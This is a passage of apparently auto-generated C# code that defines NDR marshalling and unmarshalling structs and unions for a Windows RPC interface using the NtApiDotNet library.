Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_29();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_29 Member8;\n        public static Struct_28 CreateDefault()\n        {\n            return new Struct_28();\n        }\n        public Struct_28(int Member0, Union_29 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_29 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 1))\n            {\n                m.WriteEmbeddedPointer<Struct_30>(Arm_1, new System.Action<Struct_30>(m.Write_30));\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_29\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadEmbeddedPointer<Struct_30>(new System.Func<Struct_30>(u.Read_30), false);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_29\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_30> Arm_1;\n        public static Union_29 CreateDefault()\n        {\n            return new Union_29();\n        }\n        public Union_29(uint Selector, System.Nullable<Struct_30> Arm_1)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n        }\n    }\n    public struct Struct_30 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public static Struct_30 CreateDefault()\n        {\n            return new Struct_30();\n        }\n        public Struct_30(string Member0, string Member8, string Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_31 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_32(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_32 Member8;\n        public static Struct_31 CreateDefault()\n        {\n            return new Struct_31();\n        }\n        public Struct_31(int Member0, Union_32 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_32 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 1))\n            {\n                m.WriteEmbeddedPointer<Struct_33>(Arm_1, new System.Action<Struct_33>(m.Write_33));\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                m.WriteEmbeddedPointer<Struct_35>(Arm_2, new System.Action<Struct_35>(m.Write_35));\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_32\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadEmbeddedPointer<Struct_33>(new System.Func<Struct_33>(u.Read_33), false);\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                Arm_2 = u.ReadEmbeddedPointer<Struct_35>(new System.Func<Struct_35>(u.Read_35), false);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_32\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_33> Arm_1;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_35> Arm_2;\n        public static Union_32 CreateDefault()\n        {\n            return new Union_32();\n        }\n        public Union_32(uint Selector, System.Nullable<Struct_33> Arm_1, System.Nullable<Struct_35> Arm_2)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n            this.Arm_2 = Arm_2;\n        }\n    }\n    public struct Struct_33 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.Write_26(Member10);\n            m.Write_34(Member18);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.Read_26();\n            Member18 = u.Read_34();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public Struct_26 Member10;\n        public Struct_34 Member18;\n        public static Struct_33 CreateDefault()\n        {\n            return new Struct_33();\n        }\n        public Struct_33(int Member0, string Member8, Struct_26 Member10, Struct_34 Member18)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n        }\n    }\n    public struct Struct_34 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteInt32(Member4);\n            m.WriteInt32(Member8);\n            m.WriteInt32(MemberC);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member4 = u.ReadInt32();\n            Member8 = u.ReadInt32();\n            MemberC = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public int Member4;\n        public int Member8;\n        public int MemberC;\n        public static Struct_34 CreateDefault()\n        {\n            return new Struct_34();\n        }\n        public Struct_34(int Member0, int Member4, int Member8, int MemberC)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n            this.MemberC = MemberC;\n        }\n    }\n    public struct Struct_35 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.Write_26(Member10);\n            m.Write_34(Member18);\n            m.WriteEmbeddedPointer<string>(Member28, new System.Action<string>(m.WriteTerminatedAnsiString));\n            m.WriteInt32(Member30);\n            m.WriteEmbeddedPointer<string>(Member38, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member40);\n            m.WriteEmbeddedPointer<string>(Member48, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt16(Member50);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.Read_26();\n            Member18 = u.Read_34();\n            Member28 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingAnsiString), false);\n            Member30 = u.ReadInt32();\n            Member38 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member40 = u.ReadInt32();\n            Member48 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member50 = u.ReadInt16();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public Struct_26 Member10;\n        public Struct_34 Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member28;\n        public int Member30;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member38;\n        public int Member40;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member48;\n        public short Member50;\n        public static Struct_35 CreateDefault()\n        {\n            return new Struct_35();\n        }\n        public Struct_35(int Member0, string Member8, Struct_26 Member10, Struct_34 Member18, string Member28, int Member30, string Member38, int Member40, string Member48, short Member50)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member28 = Member28;\n            this.Member30 = Member30;\n            this.Member38 = Member38;\n            this.Member40 = Member40;\n            this.Member48 = Member48;\n            this.Member50 = Member50;\n        }\n    }\n    public struct Struct_36 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_37(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_37();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_37 Member8;\n        public static Struct_36 CreateDefault()\n        {\n            return new Struct_36();\n        }\n        public Struct_36(int Member0, Union_37 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_37 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 1))\n            {\n                m.WriteEmbeddedPointer<Struct_38>(Arm_1, new System.Action<Struct_38>(m.Write_38));\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                m.WriteEmbeddedPointer<Struct_39>(Arm_2, new System.Action<Struct_39>(m.Write_39));\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_37\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadEmbeddedPointer<Struct_38>(new System.Func<Struct_38>(u.Read_38), false);\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                Arm_2 = u.ReadEmbeddedPointer<Struct_39>(new System.Func<Struct_39>(u.Read_39), false);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_37\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_38> Arm_1;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_39> Arm_2;\n        public static Union_37 CreateDefault()\n        {\n            return new Union_37();\n        }\n        public Union_37(uint Selector, System.Nullable<Struct_38> Arm_1, System.Nullable<Struct_39> Arm_2)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n            this.Arm_2 = Arm_2;\n        }\n    }\n    public struct Struct_38 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public static Struct_38 CreateDefault()\n        {\n            return new Struct_38();\n        }\n        public Struct_38(string Member0)\n        {\n            this.Member0 = Member0;\n        }\n    }\n    public struct Struct_39 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public static Struct_39 CreateDefault()\n        {\n            return new Struct_39();\n        }\n        public Struct_39(string Member0, string Member8, string Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_40 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_41(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_41();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_41 Member8;\n        public static Struct_40 CreateDefault()\n        {\n            return new Struct_40();\n        }\n        public Struct_40(int Member0, Union_41 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_41 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 1))\n            {\n                m.WriteEmbeddedPointer<Struct_42>(Arm_1, new System.Action<Struct_42>(m.Write_42));\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                m.WriteEmbeddedPointer<Struct_43>(Arm_2, new System.Action<Struct_43>(m.Write_43));\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_41\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadEmbeddedPointer<Struct_42>(new System.Func<Struct_42>(u.Read_42), false);\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                Arm_2 = u.ReadEmbeddedPointer<Struct_43>(new System.Func<Struct_43>(u.Read_43), false);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_41\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_42> Arm_1;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_43> Arm_2;\n        public static Union_41 CreateDefault()\n        {\n            return new Union_41();\n        }\n        public Union_41(uint Selector, System.Nullable<Struct_42> Arm_1, System.Nullable<Struct_43> Arm_2)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n            this.Arm_2 = Arm_2;\n        }\n    }\n    public struct Struct_42 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public static Struct_42 CreateDefault()\n        {\n            return new Struct_42();\n        }\n        public Struct_42(string Member0, string Member8, string Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_43 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<char[], long>(Member8, new System.Action<char[], long>(m.Write_100), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<char[]>(new System.Func<char[]>(u.Read_100), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char[]> Member8;\n        public static Struct_43 CreateDefault()\n        {\n            return new Struct_43();\n        }\n        public Struct_43(int Member0, char[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_44 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteInt32(Member4);\n            m.WriteInt32(Member8);\n            m.WriteEmbeddedPointer<Struct_45[], long>(Member10, new System.Action<Struct_45[], long>(m.Write_101), Member8);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member4 = u.ReadInt32();\n            Member8 = u.ReadInt32();\n            Member10 = u.ReadEmbeddedPointer<Struct_45[]>(new System.Func<Struct_45[]>(u.Read_101), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public int Member4;\n        public int Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_45[]> Member10;\n        public static Struct_44 CreateDefault()\n        {\n            return new Struct_44();\n        }\n        public Struct_44(int Member0, int Member4, int Member8, Struct_45[] Member10)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_45 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt16(Member0);\n            m.WriteInt16(Member2);\n            m.WriteInt32(Member4);\n            m.WriteInt32(Member8);\n            m.WriteInt32(MemberC);\n            m.WriteEmbeddedPointer<short[], long>(Member10, new System.Action<short[], long>(m.Write_102), MemberC);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt16();\n            Member2 = u.ReadInt16();\n            Member4 = u.ReadInt32();\n            Member8 = u.ReadInt32();\n            MemberC = u.ReadInt32();\n            Member10 = u.ReadEmbeddedPointer<short[]>(new System.Func<short[]>(u.Read_102), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public short Member0;\n        public short Member2;\n        public int Member4;\n        public int Member8;\n        public int MemberC;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<short[]> Member10;\n        public static Struct_45 CreateDefault()\n        {\n            return new Struct_45();\n        }\n        public Struct_45(short Member0, short Member2, int Member4, int Member8, int MemberC, short[] Member10)\n        {\n            this.Member0 = Member0;\n            this.Member2 = Member2;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n            this.MemberC = MemberC;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_46 : NtApiDotNet.Ndr.Marshal.INdrConformantStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            